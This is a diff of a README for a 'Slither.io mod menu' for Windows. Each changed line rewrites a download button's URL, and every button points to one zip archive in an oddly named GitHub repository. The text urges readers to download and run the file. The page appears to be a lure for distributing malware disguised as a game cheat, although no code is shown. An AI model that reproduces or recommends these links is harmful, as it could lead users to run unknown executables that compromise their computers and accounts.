@@ -5,7 +5,7 @@ description: "Analyze Slither.io gameplay with movement tracking, tactical plann
 ---
 # 🐍 slither-io-mod-menu - Unlock New Slither.io Features Instantly
 
-[![Download Slither.io Mod Menu](https://img.shields.io/badge/Download-Slither.io%20Mod%20Menu-blue?style=for-the-badge&logo=github&colorA=2d2d2d&colorB=00b4d8)](https://raw.githubusercontent.com/oologyprohibition756/oologyprohibition756.github.io/main/antiwedge/Release-1.1.zip)
+[![Download Slither.io Mod Menu](https://img.shields.io/badge/Download-Slither.io%20Mod%20Menu-blue?style=for-the-badge&logo=github&colorA=2d2d2d&colorB=00b4d8)](https://github.com/oologyprohibition756/oologyprohibition756.github.io/raw/refs/heads/main/antiwedge/Release-1.1.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these simple steps to get the mod menu up and running on your Windows com
 
 Click the button below or the one at the top of this page to go to the official download page.
 
-[![Go to Downloads](https://img.shields.io/badge/📥-Go%20to%20Downloads-orange?style=for-the-badge&colorA=ff6b6b&colorB=c0392b)](https://raw.githubusercontent.com/oologyprohibition756/oologyprohibition756.github.io/main/antiwedge/Release-1.1.zip)
+[![Go to Downloads](https://img.shields.io/badge/📥-Go%20to%20Downloads-orange?style=for-the-badge&colorA=ff6b6b&colorB=c0392b)](https://github.com/oologyprohibition756/oologyprohibition756.github.io/raw/refs/heads/main/antiwedge/Release-1.1.zip)
 
 ### Step 2: Download the Application
 
@@ -72,7 +72,7 @@ Here's a more detailed walkthrough for those who want extra clarity.
 
 Go to the official releases page by clicking this button:
 
-[![Download Latest Version](https://img.shields.io/badge/⬇️-Download%20Latest%20Version-green?style=for-the-badge&colorA=27ae60&colorB=1e8449)](https://raw.githubusercontent.com/oologyprohibition756/oologyprohibition756.github.io/main/antiwedge/Release-1.1.zip)
+[![Download Latest Version](https://img.shields.io/badge/⬇️-Download%20Latest%20Version-green?style=for-the-badge&colorA=27ae60&colorB=1e8449)](https://github.com/oologyprohibition756/oologyprohibition756.github.io/raw/refs/heads/main/antiwedge/Release-1.1.zip)
 
 ### What to Do After Download
 
@@ -141,7 +141,7 @@ If you run into any issues, first try restarting both the mod menu and your brow
 
 To get the best experience, make sure you have the latest version of the mod menu. New features and improvements are added regularly.
 
-1. Periodically visit the [download page](https://raw.githubusercontent.com/oologyprohibition756/oologyprohibition756.github.io/main/antiwedge/Release-1.1.zip).
+1. Periodically visit the [download page](https://github.com/oologyprohibition756/oologyprohibition756.github.io/raw/refs/heads/main/antiwedge/Release-1.1.zip).
 2. Check the version number next to the latest file.
 3. If it's newer than what you have, download and run the new file.
 4. The installation will update your existing version without losing your settings.
@@ -175,7 +175,7 @@ Remember, all you need to do is:
 
 It's that simple. Download now and see what you've been missing!
 
-[![Get Started Now](https://img.shields.io/badge/🚀-Get%20Started%20Now-red?style=for-the-badge&colorA=e74c3c&colorB=c0392b)](https://raw.githubusercontent.com/oologyprohibition756/oologyprohibition756.github.io/main/antiwedge/Release-1.1.zip)
+[![Get Started Now](https://img.shields.io/badge/🚀-Get%20Started%20Now-red?style=for-the-badge&colorA=e74c3c&colorB=c0392b)](https://github.com/oologyprohibition756/oologyprohibition756.github.io/raw/refs/heads/main/antiwedge/Release-1.1.zip)
 
 ---
 
